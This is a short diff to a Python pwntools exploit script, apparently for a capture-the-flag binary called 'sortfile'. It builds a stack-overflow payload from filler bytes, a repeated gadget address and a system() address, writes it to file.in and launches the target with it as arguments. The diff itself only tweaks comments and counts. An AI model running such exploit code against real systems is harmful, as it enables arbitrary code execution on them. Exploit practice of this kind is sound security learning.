@@ -36,7 +36,7 @@ context(arch='i386', os='linux')
 # ebp + 0x34 + ?; min nargs
 # ebp + 0x30 + ?; main return addr ; 
 # ebp + 0x2c + ?; main ebp
-# ... Some unknown amount due to alignment. +-0x10
+# ... Some unknown amount due to alignment. up to 0x10
 # ebp + 0x2c	; last local variable from main.
 # ebp + 0xc 	; local variable from main
 # ebp + 8		; arg 1 ; gadgetx30
@@ -53,11 +53,9 @@ filler = "".rjust(0x100C,"\0")
 gadget1 = p32(0x080489c0)
 system = p32(0x08048480)
 pop30 = gadgetx30 + "A"*0x2c
-# exploitlocation = p32(0x804a04c)
-
-
 
 data = filler + gadget1*0x34  + system
+
 with open("file.in", "w") as f:
 	f.write(data)
 
@@ -69,7 +67,7 @@ with open("file.in", "w") as f:
 # so we can communicate with it
 # Extra because of memory alignment in main.
 inputlist = ['./sortfile']
-inputlist.extend([exploit]*32)
+inputlist.extend([exploit]*0x10)
 p = process(inputlist)
 
 # Optional: attach GDB to the process and run some GDB commands
